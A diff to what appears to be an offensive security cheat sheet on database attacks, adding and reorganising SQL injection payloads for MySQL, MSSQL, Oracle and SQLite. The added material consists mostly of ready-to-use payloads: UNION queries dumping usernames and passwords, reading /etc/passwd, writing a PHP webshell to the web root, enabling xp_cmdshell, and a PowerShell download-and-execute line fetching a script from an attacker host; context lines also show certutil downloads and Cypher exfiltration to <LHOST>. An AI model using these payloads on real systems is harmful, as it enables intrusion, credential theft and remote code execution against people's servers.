@@ -61,20 +61,12 @@ SQL> enum_impersonate
 $ impacket-mssqlclient <USERNAME>@<RHOST>
 $ impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
 $ impacket-mssqlclient -k -no-pass <RHOST>
-$ sudo mssqlclient.py <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
+$ impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
 ```
 
 ```c
 $ export KRB5CCNAME=<USERNAME>.ccache
 $ impacket-mssqlclient -k <RHOST>.<DOMAIN>
-```
-
-### Privilege Escalation
-
-```c
-SQL> exec_as_login sa
-SQL> enable_xp_cmdshell
-SQL> xp_cmdshell whoami
 ```
 
 ## MongoDB
@@ -131,6 +123,16 @@ $ mdb-sql <FILE>
 
 ```c
 $ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
+$ impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth
+```
+
+### Common Commands
+
+```c
+SELECT @@version;
+SELECT name FROM sys.databases;
+SELECT * FROM <DATABASE>.information_schema.tables;
+SELECT * FROM <DATABASE>.dbo.users;
 ```
 
 ### Show Database Content
@@ -263,29 +265,6 @@ http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://<
 http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\<FILE>.exe'; --
 ```
 
-## mssqlclient.py
-
-### Common Commands
-
-```c
-SQL> enum_logins
-SQL> enum_impersonate
-```
-
-### Connection
-
-```c
-$ sudo mssqlclient.py <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
-```
-
-### Privilege Escalation
-
-```c
-SQL> exec_as_login sa
-SQL> enable_xp_cmdshell
-SQL> xp_cmdshell whoami
-```
-
 ## MySQL
 
 > https://www.mysqltutorial.org/mysql-cheat-sheet.aspx
@@ -303,9 +282,12 @@ mysql> SHOW databases;
 mysql> USE <DATABASE>;
 mysql> SHOW tables;
 mysql> DESCRIBE <TABLE>;
+mysql> SELECT version();
+mysql> SELECT system_user();
 mysql> SELECT * FROM Users;
 mysql> SELECT * FROM users \G;
 mysql> SELECT Username,Password FROM Users;
+musql> SELECT user, authentication_string FROM mysql.user WHERE user = '<USERNAME>';
 mysql> SHOW GRANTS FOR '<USERNAME>'@'localhost' \G;
 ```
 
@@ -779,7 +761,7 @@ admin") or "1"="1"/*
 {"id":"56456 AND sleep(15)#"}    // sleep 15 seconds
 ```
 
-### Payloads
+### Payload Examples
 
 ```c
 SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = '<PASSWORD>';
@@ -795,6 +777,195 @@ SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = '<PASSWO
 1=1    // is always true
 --     // comment
 -      // special character at the end just because of sql
+```
+
+### Common Injections
+
+#### MySQL & MariaDB
+
+##### Get Number of Columns
+
+```c
+-1 order by 3;#
+```
+
+##### Get Version
+
+```c
+-1 union select 1,2,version();#
+```
+
+##### Get Database Name
+
+```c
+-1 union select 1,2,database();#
+```
+
+##### Get Table Name
+
+```c
+-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
+```
+
+##### Get Column Name
+
+```c
+-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
+```
+
+##### Read a File
+
+```c
+SELECT LOAD_FILE('/etc/passwd')
+```
+
+##### Dump Data
+
+```c
+-1 union select 1,2, group_concat(<COLUMN>) from <DATABASE>.<TABLE>;#
+```
+
+##### Create Webshell
+
+```c
+LOAD_FILE('/etc/httpd/conf/httpd.conf')
+select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/<FILE>.php";
+```
+
+or
+
+```c
+LOAD_FILE('/etc/httpd/conf/httpd.conf')
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
+```
+
+#### MSSQL
+
+##### Authentication Bypass
+
+```c
+' or 1=1--
+```
+
+##### Get Version with Time-Based Injection
+
+```c
+' SELECT @@version; WAITFOR DELAY '00:00:10'; —
+```
+
+##### Enable xp_cmdshell
+
+```c
+' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+```
+
+##### Remote Code Execution (RCE)
+
+```c
+' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--
+```
+
+#### Orcale SQL
+
+##### Authentication Bypass
+
+```c
+' or 1=1--
+```
+
+##### Get Number of Columns
+
+```c
+' order by 3--
+```
+
+##### Get Table Name
+
+```c
+' union select null,table_name,null from all_tables--
+```
+
+##### Get Column Name
+
+```c
+' union select null,column_name,null from all_tab_columns where table_name='<TABLE>'--
+```
+
+##### Dump Data
+
+```c
+' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
+```
+
+#### SQLite
+
+##### Extracting Table Names
+
+```c
+http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
+```
+
+##### Extracting User Table
+
+```c
+http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
+```
+
+### Error-based SQL Injection (SQLi)
+
+```c
+<USERNAME>' OR 1=1 -- //
+```
+
+Results in:
+
+```c
+SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
+```
+
+```c
+' or 1=1 in (select @@version) -- //
+' OR 1=1 in (SELECT * FROM users) -- //
+' or 1=1 in (SELECT password FROM users) -- //
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+```
+
+### UNION-based SQL Injection (SQLi)
+
+#### Manual Injection Steps
+
+```c
+$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search_input"]."%'";
+```
+
+```c
+' ORDER BY 1-- //
+```
+
+```c
+%' UNION SELECT database(), user(), @@version, null, null -- //
+```
+
+```c
+' UNION SELECT null, null, database(), user(), @@version  -- //
+```
+
+```c
+' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
+```
+
+```c
+' UNION SELECT null, username, password, description, null FROM users -- //
+```
+
+### Blind SQL Injection (SQLi)
+
+```c
+http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
+```
+
+```c
+http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
 ```
 
 ### Manual SQL Injection
@@ -834,7 +1005,7 @@ SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FR
 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM <TABLE>
 ```
 
-### Manual Blind SQL Injection (Authentication Bypass)
+### Manual Blind Authentication Bypass SQL Injection
 
 > https://<RHOST>/article?id=3
 
@@ -842,7 +1013,7 @@ SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FR
 0 SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;
 ```
 
-### Manual Blind SQL Injection (BooleanBased)
+### Manual BooleanBased Blind SQL Injection
 
 > https://<RHOST>/checkuser?username=admin
 
@@ -865,7 +1036,7 @@ admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password
 admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '1234%';--
 ```
 
-### Manual Blind SQL Injection (Time-Based)
+### Manual Time-Based Blind SQL Injection
 
 > https://<RHOST>/analytics?referrer=<RHOST>
 
@@ -981,6 +1152,8 @@ l RETURN 0 as _0 //
 ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://<LHOST>/?' + p
 +'='+toString(f[p]) as l RETURN 0 as _0 //
 ```
+
+
 
 ## sqlite3
 
